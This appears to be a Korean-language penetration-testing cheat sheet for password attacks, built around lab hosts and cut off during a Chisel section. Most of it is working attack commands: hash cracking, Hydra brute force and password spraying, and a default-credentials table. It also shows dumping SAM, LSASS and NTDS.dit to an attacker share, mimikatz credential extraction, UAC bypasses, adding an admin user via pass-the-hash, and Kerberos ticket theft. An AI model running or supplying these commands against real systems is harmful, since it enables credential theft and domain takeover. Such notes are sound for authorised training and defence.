# 1. John The Ripper

### Single Crack Mode
```john --single <hash or hash_file>```

### Wordlist Mode
```john --wordlist=<wordlist_file> --rules <hash_file>```

### Incremental Mode (문자 조합 사용)
```john --incremental <hash_file>```

### 해시 식별
- [JtR의 샘플 해시 문서](https://openwall.info/wiki/john/sample-hashes) 나 [PentestMonkey의 이 목록을](https://pentestmonkey.net/cheat-sheet/john-the-ripper-hash-formats) 참조
- [hashID](https://github.com/psypanda/hashID)와 같은 도구를 사용 : 
```$ hashid -j 193069ceb0461e1d40d216e32c79c704```

### 파일 Cracking
```
pdf2john server_doc.pdf > server_doc.hash
john server_doc.hash
  또는
john --wordlist=<wordlist.txt> server_doc.hash
```
| **Tool**                | **Description**                               |
| ----------------------- | --------------------------------------------- |
| `pdf2john`              | Converts PDF documents for John               |
| `ssh2john`              | Converts SSH private keys for John            |
| `mscash2john`           | Converts MS Cash hashes for John              |
| `keychain2john`         | Converts OS X keychain files for John         |
| `rar2john`              | Converts RAR archives for John                |
| `pfx2john`              | Converts PKCS#12 files for John               |
| `truecrypt_volume2john` | Converts TrueCrypt volumes for John           |
| `keepass2john`          | Converts KeePass databases for John           |
| `vncpcap2john`          | Converts VNC PCAP files for John              |
| `putty2john`            | Converts PuTTY private keys for John          |
| `zip2john`              | Converts ZIP archives for John                |
| `hccap2john`            | Converts WPA/WPA2 handshake captures for John |
| `office2john`           | Converts MS Office documents for John         |
| `wpa2john`              | Converts WPA/WPA2 handshakes for John         |

- 툴 위치 검색 : ```$ locate *2john*```

<br/><br/>
# 2. Hashcat

- `-a`는 `attack mode`를 지정
- `-m`은 `hash type`를 지정
- `<hashes>`는 해시 문자열이거나 동일한 유형의 암호 해시를 하나 이상 포함
- `[wordlist, rule, mask, ...]`는 공격 모드에 따라 달라지는 추가 인수<br/>
```$ hashcat -a 0 -m 0 <hashes> [wordlist, rule, mask, ...]```

### Hash types
1. [해시 예시](https://hashcat.net/wiki/doku.php?id=example_hashes) 목록<br/>
2. [hashID](https://github.com/psypanda/hashID)를 사용하면 `-m` 인수를 지정하여 hashcat 해시 유형 식별<br/>
```$ hashid -m '$1$FNr44XZC$wQxY6HHLrgrGX0e1195k.1'```

### Dictionary attack
- 사전 공격(`-a 0`), MD5 해시(`-m 0`)<br/>
```$ hashcat -a 0 -m 0 e3e3ec5831ad5e7288241960e5d4fdb8 /usr/share/wordlists/rockyou.txt```

- 사전 공격으로 해독할 수 없을 경우, 룰(rule) 기반 공격 시도(예 : best64.rule)<br/>
```$ hashcat -a 0 -m 0 1b0556a75770563578569ae21392630c /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule```

### Mask attack
- 비밀번호 길이나 조합이 예측가능한 경우, 사용자 지정 문자 집합(`-a 3`) + 문자셋 조합

| Symbol | Charset                             |
| ------ | ----------------------------------- |
| ?l     | abcdefghijklmnopqrstuvwxyz          |
| ?u     | ABCDEFGHIJKLMNOPQRSTUVWXYZ          |
| ?d     | 0123456789                          |
| ?h     | 0123456789abcdef                    |
| ?H     | 0123456789ABCDEF                    |
| ?s     | «space»!"#$%&'()*+,-./:;<=>?@[]^_`{ |
| ?a     | ?l?u?d?s                            |
| ?b     | 0x00 - 0xff                         |

```$ hashcat -a 3 -m 0 1e293d6912d074c0fd15844d803400dd '?u?l?l?l?l?d?s'```

### Custom Wordlists and Rules
```
ls /usr/share/hashcat/rules/
cat custom.rule

:
c
so0
c so0
sa@
c sa@
c sa@ so0
$!
$! c
$! so0
$! sa@
$! c so0
$! c sa@
$! so0 sa@
$! c so0 sa@
```
```hashcat --force password.list -r custom.rule --stdout | sort -u > mut_password.list```

### CeWL를 이용한 Wordlist 생성
- 깊이(`-d`), 단어의 최소 길이(`-m`), 검색된 단어의 소문자 저장(`--lowercase`), 그리고 결과를 저장할 파일(`-w`)<br/>
```cewl https://www.domain.com -d 4 -m 6 --lowercase -w inlane.wordlist```

<br/><br/>
# 3. Hunting for Encrypted Files

### SSH Key Cracking
- `grep`와 같은 도구로 SSH 개인키 검색<br/>
```$ grep -rnE '^\-{5}BEGIN [A-Z0-9]+ PRIVATE KEY\-{5}$' /* 2>/dev/null```
- SSH 키가 암호화되었는지 확인하기 위해 `ssh-keygen`을 사용하여 키를 읽어 봄<br/>
```ssh-keygen -yf ~/.ssh/id_ed25519```
```
ssh2john.py SSH.private > ssh.hash
john --wordlist=rockyou.txt ssh.hash
john ssh.hash --show
```

### Cracking Documents
```
office2john.py Protected.docx > protected-docx.hash
john --wordlist=rockyou.txt protected-docx.hash
```

### Cracking PDFs
```
pdf2john.py PDF.pdf > pdf.hash
john --wordlist=rockyou.txt pdf.hash
```

### Cracking ZIP
```
zip2john ZIP.zip > zip.hash
john --wordlist=rockyou.txt zip.hash
```

### Cracking OpenSSL Encrypted Archives (예 : .gzip)
```
file GZIP.gzip 
for i in $(cat rockyou.txt);do openssl enc -aes-256-cbc -d -in GZIP.gzip -k $i 2>/dev/null| tar xz;done
```

### Cracking BitLocker Encrypted Drives
```
bitlocker2john -i Backup.vhd > backup.hashes
grep "bitlocker\$0" backup.hashes > backup.hash
hashcat -m 22100 backup.hash /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt -o backup.cracked
```

<br/><br/>
# 4. Remote Password Attacks

### NetExec(CrackMapExec) - WinRM
```netexec <proto> <target-IP> -u <user or userlist> -p <password or passwordlist>```<br/>
예) ```netexec winrm 192.168.1.1 -u user.list -p password.list```

### Evil-WinRM
```evil-winrm -i <target-IP> -u <username> -p <password>```<br/>
예) ```evil-winrm -i 192.168.1.1 -u user -p password```

### Hydra - SSH
```hydra -L user.list -P password.list ssh://192.168.1.1```

### Hydra - RDP
```hydra -L user.list -P password.list rdp://192.168.1.1```

### Hydra - SMB
```hydra -L user.list -P password.list smb://192.168.1.1```

### MSF - SMB (SMBv3)
```msf6 > use auxiliary/scanner/smb/smb_login```

### NetExec(CrackMapExec) - SMB Share
```crackmapexec smb 192.168.1.1 -u "user" -p "password" --shares```

### Smbclient
```smbclient -U user \\\\192.168.1.1\\SHARENAME```

<br/><br/>
# 5. Password 재사용 / 기본 Passwords

### Password spraying
```$ netexec smb 10.100.38.0/24 -u <usernames.list> -p 'ChangeMe123!'```

### Credential Stuffing - Hydra
```$ hydra -C <user_pass.list> <protocol>://<IP>```

### Default Credentials
```
$ pip3 install defaultcreds-cheat-sheet
$ creds search linksys
```

[DefaultCreds-Cheat-Sheet](https://github.com/ihebski/DefaultCreds-cheat-sheet)
| **Product/Vendor** | **Username** | **Password**                 |
| ------------------ | ------------ | ---------------------------- |
| Zyxel (ssh)        | zyfwp        | PrOw!aN_fXp                  |
| APC UPS (web)      | apc          | apc                          |
| Weblogic (web)     | system       | manager                      |
| Weblogic (web)     | system       | manager                      |
| Weblogic (web)     | weblogic     | weblogic1                    |
| Weblogic (web)     | WEBLOGIC     | WEBLOGIC                     |
| Weblogic (web)     | PUBLIC       | PUBLIC                       |
| Weblogic (web)     | EXAMPLES     | EXAMPLES                     |
| Weblogic (web)     | weblogic     | weblogic                     |
| Weblogic (web)     | system       | password                     |
| Weblogic (web)     | weblogic     | welcome(1)                   |
| Weblogic (web)     | system       | welcome(1)                   |
| Weblogic (web)     | operator     | weblogic                     |
| Weblogic (web)     | operator     | password                     |
| Weblogic (web)     | system       | Passw0rd                     |
| Weblogic (web)     | monitor      | password                     |
| Kanboard (web)     | admin        | admin                        |
| Vectr (web)        | admin        | 11_ThisIsTheFirstPassword_11 |
| Caldera (web)      | admin        | admin                        |
| Dlink (web)        | admin        | admin                        |
| Dlink (web)        | 1234         | 1234                         |
| Dlink (web)        | root         | 12345                        |
| Dlink (web)        | root         | root                         |
| JioFiber           | admin        | jiocentrum                   |
| GigaFiber          | admin        | jiocentrum                   |
| Kali linux (OS)    | kali         | kali                         |
| F5                 | admin        | admin                        |
| F5                 | root         | default                      |
| F5                 | support      |                              |
| ...                | ...          | ...                          |
|                    |              |                              |

[Default Router Credentials](https://www.softwaretestinghelp.com/default-router-username-and-password-list/)

<br/><br/>
# 5. Extracting Passwords from Windows Systems

## Attacking SAM, SYSTEM, and SECURITY
#### reg.exe로 Registry Hives 복사
```
reg.exe save hklm\sam C:\sam.save
reg.exe save hklm\system C:\system.save
reg.exe save hklm\security C:\security.save
```

#### Impacket's smbserver.py로 공유 생성
- smb2support 옵션(최신 버전의 SMB가 지원), 공유 이름(`CompData`), 저장할 공격 호스트의 디렉토리(`/home/ltnbob/Documents`) 지정<br/>
```$ sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/ltnbob/Documents/```

- move 명령으로 Hive 복사본 이동
```
C:\> move sam.save \\<SMB Share IP>\CompData
C:\> move security.save \\<SMB Share IP>\CompData
C:\> move system.save \\<SMB Share IP>\CompData
```

#### Impacket's secretsdump.py로 Dumping Hashes
```secretsdump.py -sam sam.save -security security.save -system system.save LOCAL```<br/>
※ secretsdump SAM Hash 출력 : (uid:rid:lmhash:nthash)

#### Hashcat으로 Cracking Hashes (NT Hash)
```hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt```

### DCC2 hashes
- `hklm\security`, PBKDF2를 사용하기 때문에 NT 해시보다 해독하기 어려움<br/>
```$ hashcat -m 2100 '$DCC2$10240#administrator#23d97555681813db79b2ade4b4a6ff25' /usr/share/wordlists/rockyou.txt```

### DPAPI
- DPAPI 암호화된 자격 증명(IE, Chrome, Outlook 등)은 Impacket의 [dpapi](https://github.com/fortra/impacket/blob/master/examples/dpapi.py), [mimikatz](https://github.com/gentilkiwi/mimikatz)와 같은 도구를 사용([DonPAPI](https://github.com/login-securite/DonPAPI) : 원격)<br/>
```
C:\Users\Public> mimikatz.exe
mimikatz # dpapi::chrome /in:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Login Data" /unprotect
```

### Remote Dumping
```netexec smb 192.168.1.1 --local-auth -u <user> -p <password> --lsa```<br/>
```netexec smb 192.168.1.1 --local-auth -u <user> -p <password> --sam```<br/>

<br/><br/>
## Attacking Lsass
### PowerShell을 이용한 LSASS 프로세스 덤프
```
Get-Process lsass
rundll32 C:\windows\system32\comsvcs.dll, MiniDump <PID> C:\lsass.dmp full
```

### Pypykatz를 사용하여 자격 증명 추출
```pypykatz lsa minidump ./lsass.dmp```

### Cracking the NT Hash with Hashcat
```sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt```

## Attacking Windows Credential Manager
### cmdkey로 자격 증명 열거
```C:\>cmdkey /list```
- SRV01\mcharles 사용자로 가장 : ```C:\>runas /savecred /user:SRV01\mcharles cmd```

### Mimikatz를 사용하여 자격 증명 추출
```
C:\Users\Administrator\Desktop> mimikatz.exe
mimikatz # privilege::debug
mimikatz # sekurlsa::credman
```
- 저장된 자격 증명을 열거하고 추출하는 데 사용할 수 있는 다른 도구 : [SharpDPAPI](https://github.com/GhostPack/SharpDPAPI) , [LaZagne](https://github.com/AlessandroZ/LaZagne) , [DonPAPI](https://github.com/login-securite/DonPAPI) 등

- UAC 우회(2가지 중 선택)
```
# fodhelper.exe 사용:

> reg add HKCU\Software\Classes\ms-settings\shell\open\command /f /ve /t REG_SZ /d "cmd.exe" && start fodhelper.exe

# computerdefaults.exe 사용:

> reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ /d "" /f && reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /ve /t REG_SZ /d "cmd.exe" /f && start computerdefaults.exe
```

```
# 도메인 백업 키 추출(Windows)
.\SharpDPAPI.exe backupkey /nowrap

# 자격 증명 복호화(Windows)
.\SharpDPAPI.exe credentials /pvk:<Backup Key>
```
```
# 도메인 백업 키 추출(Linux)
impacket-dpapi backupkeys -t contoso.com/Administrator:'Password123!'@192.168.1.11 -dc-ip '192.168.1.11'

# 마스터 키 복호화(Linux)
impacket-dpapi masterkey -file masterkey -password 'x' -sid 'S-1-5-21-1706474481-3154330266-3610869000-500' -key 'x' -pvk backupkey.pvk

# 자격 증명 복호화(Linux)
impacket-dpapi credential -file vault -key '0x46cfb8b408aab4ae66ffbbbcf67ac03cfc919587e4ec39b9a936f6c93d92386603bb56b2d861be88495529dd74b23487ab78dcd98a1576b9b30ddc10ed379f2e'
```

<br/><br/>
## Attacking Active Directory & NTDS.dit
- 사용자 이름 목록 수동 생성 : [Username Anarchy](https://github.com/urbanadventurer/username-anarchy)<br/>
```$ git clone https://github.com/urbanadventurer/username-anarchy.git```<br/>
```$ ./username-anarchy -i ./usernames.txt > ./names.txt```

### Kerbrute를 사용하여 유효한 사용자 이름 열거
```$ ./kerbrute_linux_amd64 userenum --dc 10.129.201.57 --domain inlanefreight.local names.txt```

### brute-force attack with NetExec
```netexec smb 10.129.201.57 -u bwilliamson -p /usr/share/wordlists/fasttrack.txt```

### Evil-WinRM, Vssadmin를 이용한 NTDS.dit 복사
```
*Evil-WinRM* PS C:\> vssadmin CREATE SHADOW /For=C:
*Evil-WinRM* PS C:\NTDS> cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit
*Evil-WinRM* PS C:\NTDS> cmd.exe /c move C:\NTDS\NTDS.dit \\192.168.1.1\Share
```

### NTDS.dit에서 해시 추출
```$ impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL```

### NetExec를 이용한 NTDS.dit 덤프
```$ netexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! -M ntdsutil```

<br/><br/>
## 자격증명 검색

### Lazagne 사용하여 자격증명 검색
- [LaZagne standalone](https://github.com/AlessandroZ/LaZagne/releases/)을 다운로드하여 실행<br/>
```> start lazagne.exe all```

### findstr 사용하여 자격증명 검색
```findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml```<br/>
```
주요 검색 키워드
Passwords
Passphrases
Keys
Username
User account
Creds
Users
Passkeys
configuration
dbcredential
dbpassword
pwd
Login
Credentials
```

<br/><br/>
# 6. Linux Local Password Attacks

## Shadow 파일
- `$<type>$<salt>$<hashed>`

### Algorithm Types
| ID     | Cryptographic Hash Algorithm                                          |
| ------ | --------------------------------------------------------------------- |
| `1`    | [MD5](https://en.wikipedia.org/wiki/MD5)                              |
| `2a`   | [Blowfish](https://en.wikipedia.org/wiki/Blowfish_\(cipher\))         |
| `5`    | [SHA-256](https://en.wikipedia.org/wiki/SHA-2)                        |
| `6`    | [SHA-512](https://en.wikipedia.org/wiki/SHA-2)                        |
| `sha1` | [SHA1crypt](https://en.wikipedia.org/wiki/SHA-1)                      |
| `y`    | [Yescrypt](https://github.com/openwall/yescrypt)                      |
| `gy`   | [Gost-yescrypt](https://www.openwall.com/lists/yescrypt/2019/06/30/1) |
| `7`    | [Scrypt](https://en.wikipedia.org/wiki/Scrypt)                        |

### 저장된 오래된 비밀번호 확인
```cat /etc/security/opasswd```

<br/><br/>
## Cracking Linux Credentials

### Unshadow, Hashcat으로 Cracking
- [unshadow](https://github.com/pmittaldev/john-the-ripper/blob/master/src/unshadow.c) : `passwd` 파일과 `shadow` 파일을 결합하여 크래킹에 적합한 단일 파일로 만듬
```
$ sudo cp /etc/passwd /tmp/passwd.bak 
$ sudo cp /etc/shadow /tmp/shadow.bak 
$ unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadowed.hashes

$ john --single /tmp/unshadowed.hashes
  또는
$ hashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt -o /tmp/unshadowed.cracked
```

### Hashcat으로 MD5 Hash Cracking
```hashcat -m 500 -a 0 md5-hashes.list rockyou.txt```

<br/><br/>
## 파일 검색

### 구성 파일 검색
```for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done```

### 구성 파일에서 자격증명 검색 (예 : .cnf)
```for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2>/dev/null | grep -v "\#";done```

### DB 파일 검색
```for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man";done```

### 노트 검색 (확장자가 없는 파일 포함)
```find /home/* -type f -name "*.txt" -o ! -name "*.*"```

### 스크립트 검색
```for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share";done```

### Cronjobs 검색
```cat /etc/crontab```<br/>
```ls -la /etc/cron.*/```

### SSH Private Keys 검색
```grep -rnw "PRIVATE KEY" /home/* 2>/dev/null | grep ":1"```

### SSH Public Keys 검색
```grep -rnw "ssh-rsa" /home/* 2>/dev/null | grep ":1"```

### Bash History 확인
```tail -n5 /home/*/.bash*```

### Log에서 특정 문자열 검색
```for i in $(ls /var/log/* 2>/dev/null);do GREP=$(grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null); if [[ $GREP ]];then echo -e "\n#### Log file: " $i; grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null;fi;done```

<br/><br/>
## Memory & Cache 검색

### Memory - Mimipenguin
```sudo python3 mimipenguin.py```

### Memory - LaZagne
```sudo python2.7 laZagne.py all```

<br/><br/>
## Browsers 검색

### Firefox에 저장된 자격증명 검색
```
ls -l .mozilla/firefox/ | grep default
cat .mozilla/firefox/1bplpd86.default-release/logins.json | jq .
```

### Firefox에 저장된 자격증명 Decrypt
```python3.9 firefox_decrypt.py```

### Browsers - LaZagne
```python3 laZagne.py browsers```

<br/><br/>
# 7. Extracting Passwords from the Network

## Credential Hunting in Network Traffic

### Pcredz
- [Pcredz](https://github.com/lgandx/PCredz)는 실시간 트래픽이나 네트워크 패킷 캡처에서 자격 증명을 추출하는 데 사용<br/>
```
$ apt install python3-pip && sudo apt install libpcap-dev && sudo apt install file && pip3 install Cython && pip3 install python-libpcap
$ git clone https://github.com/lgandx/PCredz.git
$ ./Pcredz -f ../demo.pcapng -t -v
```

<br/><br/>
## Credential Hunting in Network Shares

### PowerShell(Windows)
```Get-ChildItem -Recurse -Include *.ext \\Server\Share | Select-String -Pattern "passw"```

### Snaffler(Windows)
- [Snaffler](https://github.com/SnaffCon/Snaffler)는 도메인에 가입된 컴퓨터에서 실행될 때 접근 가능한 네트워크 공유를 자동으로 식별<br/>
```c:\Users\Public>Snaffler.exe -s -u```<br/>

### PowerHuntShares(Windows)
- [PowerHuntShares](https://github.com/NetSPI/PowerHuntShares)는 도메인에 가입된 컴퓨터에서 실행할 필요가 없는 PowerShell 스크립트<br/>
```
PS> Set-ExecutionPolicy -Scope Process Bypass
PS> Import-Module .\PowerHuntShares.psm1
PS> Invoke-HuntSMBShares -Threads 100 -OutputDirectory c:\Users\Public
```

### MANSPIDER(Linux)
- [MANSPIDER](https://github.com/blacklanternsecurity/MANSPIDER)는 도메인에 가입된 컴퓨터에 접근할 수 없거나 원격으로 파일을 검색하고 싶은 경우 사용<br/>
```$ docker run --rm -v ./manspider:/root/.manspider blacklanternsecurity/manspider 10.129.234.121 -c 'passw' -u 'mendres' -p 'Inlanefreight2025!'```

### NetExec(Linux)
- `--spider`, `-M spider_plus` 옵션을 사용하여 네트워크 공유를 검색하는데 사용<br/>
```$ nxc smb 10.129.234.121 -u mendres -p 'Inlanefreight2025!' --spider IT --content --pattern "passw"```<br/>
```$ nxc smb 10.129.234.121 -u mendres -p 'Inlanefreight2025!' -M spider_plus```

<br/><br/>
# 8. Windows Lateral Movement

## Pass the Hash(PtH)

### Pass the Hash with Mimikatz(Windows)
```c:\tools> mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe" exit```<br/>

### Pass the Hash with PowerShell Invoke-TheHash(Windows)
- [Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash)는 WMI 및 SMB로 해시 패스 공격을 수행하기 위한 PowerShell 함수 모음<br/>
```
PS c:\tools\Invoke-TheHash> Import-Module .\Invoke-TheHash.psd1
PS c:\tools\Invoke-TheHash> Invoke-SMBExec -Target 172.16.1.10 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "net user mark Password123 /add && net localgroup administrators mark /add" -Verbose
```

### Pass the Hash with Impacket(Linux)
```$ impacket-psexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453```<br/>
- [impacket-wmiexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py)
- [impacket-atexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/atexec.py)
- [impacket-smbexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbexec.py)

### Pass the Hash with CrackMapExec(Linux)
```$ crackmapexec smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453```<br/>
로컬 관리자 시도 : ```$ crackmapexec smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453 --local-auth```<br/>
명령 실행 : ```$ crackmapexec smb 10.129.201.126 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453 -x whoami```

### Pass the Hash with evil-winrm(Linux)
```$ evil-winrm -i 10.129.201.126 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453```<br/>
> 도메인 계정을 사용하는 경우 도메인 이름(예 : administrator@inlanefreight.htb)을 포함해야 함

### Pass the Hash with RDP(Linux)
- `Restricted Admin Mode` 활성화 필요<br/>
```c:\tools> reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f```<br/>
```$ xfreerdp  /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B```

### UAC Limits Pass the Hash for Local Accounts
- `HKLM\SWOREATE\Microsoft\Windows\CurrentVersion\Policys\System\LocalAccountTokenFilterPolicy`가 0으로 설정되어 있으면 내장된 로컬 관리자 계정(RID-500, "Administrator")이 원격 관리 작업을 수행할 수 있는 유일한 로컬 계정임<br/>
- 1로 설정하면 다른 로컬 관리자도 사용할 수 있음
> `FilterAdministratorToken`(기본적으로 비활성화됨)이 활성화된 경우(값 1), RID-500 계정(Administrator)이 UAC 보호

<br/><br/>
## Pass the Ticket (PtT) from Windows

### Windows에서 Kerberos 티켓 수집
> 모든 티켓을 수집하려면 Mimikatz 또는 Rubeus를 관리자로 실행해야 함

#### Mimikatz - Export Tickets
```
c:\tools> mimikatz.exe
mimikatz # privilege::debug
mimikatz # sekurlsa::tickets /export
c:\tools> dir *.kirbi
```
- `$`로 끝나는 티켓은 Active Directory와 상호 작용하려면 티켓이 필요한 컴퓨터 계정에 해당<br/>
- 사용자 티켓에는 사용자의 이름과 서비스 이름과 도메인을 구분하는 `@`가 뒤따름(예: `[randomvalue]-username@service-domain.local.kirbi`)<br/>
> Mimikatz 버전 2.2.0 20220919를 사용하여 "sekurlsa::ekeys"를 실행하면 일부 Windows 10 버전에서 모든 해시가 des_cbc_md4로 표시.
> 내보낸 티켓(sekurlsa::tickets/export)이 잘못된 암호화로 인해 올바르게 작동하지 않음.
> 새 티켓을 생성하거나 Rubeus를 사용하여 기본 64 형식으로 티켓을 내보냄

#### Rubeus - Export Tickets
```c:\tools> Rubeus.exe dump /nowrap```

### Pass the Key or OverPass the Hash(티켓 위조)
> Mimikatz는 해시 패스/키 패스 공격을 수행하려면 관리자 권한이 필요하지만, Rubeus는 그렇지 않음

#### Mimikatz - Extract Kerberos Keys
```
c:\tools> mimikatz.exe
mimikatz # privilege::debug
mimikatz # sekurlsa::ekeys
```

#### Mimikatz - Pass the Key or OverPass the Hash
```
c:\tools> mimikatz.exe
mimikatz # privilege::debug
mimikatz # sekurlsa::pth /domain:inlanefreight.htb /user:plaintext /ntlm:3f74aa8f08f712f09cd5177b5c1ce50f
```

#### Rubeus - Pass the Key or OverPass the Hash
```c:\tools> Rubeus.exe  asktgt /domain:inlanefreight.htb /user:plaintext /aes256:b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60 /nowrap```

### Pass the Ticket(PtT)

#### Rubeus Pass the Ticket
```c:\tools> Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /rc4:3f74aa8f08f712f09cd5177b5c1ce50f /ptt```<br/>
```
c:\tools> Rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi
c:\tools> dir \\DC01.inlanefreight.htb\c$
```

#### Convert .kirbi to Base64 Format
```PS c:\tools> [Convert]::ToBase64String([IO.File]::ReadAllBytes("[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"))```

#### Pass the Ticket - Base64 Format
```
Rubeus.exe ptt /ticket:doIE1jCCBNKgAwIBBaEDAgEWooID+TCCA/VhggPxMIID7aADAgEFoQkbB0hUQi5DT02iHDAaoAMCAQKhEzARGwZrcmJ0Z3QbB2h0Yi5jb22jggO7MIIDt6ADAgESoQMCAQKiggOpBIIDpY8Kcp4i71zFcWRgpx8ovymu3HmbOL4MJVCfkGIrdJEO0iPQbMRY2pzSrk/gHuER2XRLdV/<SNIP>
c:\tools> dir \\DC01.inlanefreight.htb\c$
```

#### Mimikatz - Pass the Ticket
```
C:\tools> mimikatz.exe
mimikatz # privilege::debug
mimikatz # kerberos::ptt "C:\Users\plaintext\Desktop\Mimikatz\[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"
c:\tools> dir \\DC01.inlanefreight.htb\c$
```
> Mimikatz 모듈 `misc`을 사용하여 `misc::cmd`명령을 사용하여 가져온 티켓으로 새 명령 프롬프트 창을 시작 가능

### Mimikatz - PowerShell Remoting with Pass the Ticket

#### Mimikatz - Pass the Ticket for Lateral Movement
```
C:\tools> mimikatz.exe
mimikatz # privilege::debug
mimikatz # kerberos::ptt "C:\Users\Administrator.WIN01\Desktop\[0;1812a]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi"
c:\tools>powershell
PS C:\tools> Enter-PSSession -ComputerName DC01
[DC01]: PS C:\Users\john\Documents> whoami
```

### Rubeus - PowerShell Remoting with Pass the Ticket

#### Create a Sacrificial Process with Rubeus
```C:\tools> Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show```

#### Rubeus - Pass the Ticket for Lateral Movement
```
C:\tools> Rubeus.exe asktgt /user:john /domain:inlanefreight.htb /aes256:9279bcbd40db957a0ed0d3856b2e67f9bb58e6dc7fc07207d0763ce2713f11dc /ptt
c:\tools> powershell
PS C:\tools> Enter-PSSession -ComputerName DC01
[DC01]: PS C:\Users\john\Documents> whoami
```

<br/><br/>
## Pass the Ticket (PtT) from Linux
> Linux 컴퓨터에서 Kerberos 티켓을 사용하려면 도메인에 가입할 필요가 없음

### Linux 및 Active Directory 통합 식별
- [realm](https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/7/html/windows_integration_guide/cmd-realmd)이라는 도구를 사용하여 Linux 머신이 도메인에 가입되었는지 확인<br/>
```$ realm list```
- [sssd](https://sssd.io/) 또는 [winbind](https://www.samba.org/samba/docs/current/man-html/winbindd.8.html) 도구 사용 여부로 확인 가능<br/>
```$ ps -ef | grep -i "winbind\|sssd"```<br/>
- 참고 :  [블로그 게시물](https://web.archive.org/web/20210624040251/https://www.2daygeek.com/how-to-identify-that-the-linux-server-is-integrated-with-active-directory-ad/)

### Finding Keytab Files

#### Find를 사용하여 이름에 Keytab이 있는 파일 검색
```$ find / -name *keytab* -ls 2>/dev/null```

#### Cronjobs에서 Keytab 파일 식별
```$ crontab -l```

### Finding ccache Files

#### ccache 파일의 환경 변수 검토
```$ env | grep -i krb5```

#### Searching for ccache Files in /tmp
```$ ls -la /tmp```

### Abusing KeyTab Files

#### Listing keytab File Information
```$ klist -k -t /opt/specialfiles/carlos.keytab```

#### keytab을 사용하여 사용자 가장하기
```
$ klist
$ kinit carlos@INLANEFREIGHT.HTB -k -t
$ klist
```
> **kinit**은 대소문자를 구분하므로 klist에 표시된 것처럼 주체 이름을 사용해야 함

#### Connecting to SMB Share as Carlos
```$ smbclient //dc01/carlos -k -c ls```

### Keytab Extract

#### KeyTabExtract를 사용하여 키탭 해시 추출
```$ python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab```
- [Hashcat](https://hashcat.net/), [John the Ripper](https://www.openwall.com/john/), [https://crackstation.net/](https://crackstation.net/)

#### Log in as Carlos
```
$ su - carlos@inlanefreight.htb
$ klist
```

### Abusing Keytab ccache

#### Privilege Escalation to Root
```
$ sudo -l
(사용자가 모든 명령을 루트로 실행할 수 있는 경우)
$ sudo su
```

#### Looking for ccache Files
```# ls -la /tmp```

#### id 명령을 사용하여 그룹 멤버십 식별
```# id julio@inlanefreight.htb```

#### Importing the ccache File into our Current Session
```
# klist
# cp /tmp/krb5cc_647401106_I8I133 .
# export KRB5CCNAME=/root/krb5cc_647401106_I8I133
# klist
# smbclient //dc01/C$ -k -c ls -no-pass
```

### Kerberos와 함께 Linux 공격 도구 사용

#### Host File Modified
```
$ cat /etc/hosts

# Host addresses

172.16.1.10 inlanefreight.htb   inlanefreight   dc01.inlanefreight.htb  dc01
172.16.1.5  ms01.inlanefreight.htb  ms01
```

#### 프록시체인 구성 파일
```
$ cat /etc/proxychains.conf

<SNIP>

[ProxyList]
socks5 127.0.0.1 1080
```

#### Download Chisel to Attack Host
```
